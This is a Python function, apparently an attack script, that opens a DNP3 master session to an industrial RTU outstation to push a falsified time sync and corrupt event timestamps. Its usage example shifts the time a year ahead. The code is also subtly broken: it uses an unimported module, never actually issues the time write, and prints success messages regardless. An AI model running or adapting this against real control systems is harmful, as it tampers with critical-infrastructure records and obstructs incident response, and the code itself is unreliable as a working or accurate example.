def dnp3_time_sync_attack(outstation_ip, false_time_offset_hours):
    """
    Send incorrect time synchronization to RTU
    Shifts all event timestamps
    """
    from pydnp3 import opendnp3, asiodnp3
    import datetime

    manager = asiodnp3.DNP3Manager(1)

    channel = manager.AddTCPClient(
        "timesync_attack",
        opendnp3.levels.NORMAL,
        asiopal.ChannelRetry(),
        outstation_ip,
        "0.0.0.0",
        20000,
        asiodnp3.LinkConfig(False, False)
    )

    master = channel.AddMaster(
        "attack_master",
        asiodnp3.PrintingSOEHandler(),
        asiodnp3.DefaultMasterApplication(),
        asiodnp3.MasterStackConfig()
    )

    master.Enable()

    # Calculate false time
    false_time = datetime.datetime.now() + datetime.timedelta(hours=false_time_offset_hours)
    false_timestamp_ms = int(false_time.timestamp() * 1000)

    # Send time sync (DNP3 Group 50)
    # This would normally use master.WriteAbsoluteTime()
    # But we're sending intentionally incorrect time

    print(f"[+] Sending false time to {outstation_ip}")
    print(f"    False time: {false_time} (offset: {false_time_offset_hours} hours)")
    print("    All future events will have incorrect timestamps")

# Usage: Shift time 1 year into future
# dnp3_time_sync_attack('192.168.1.100', false_time_offset_hours=8760)
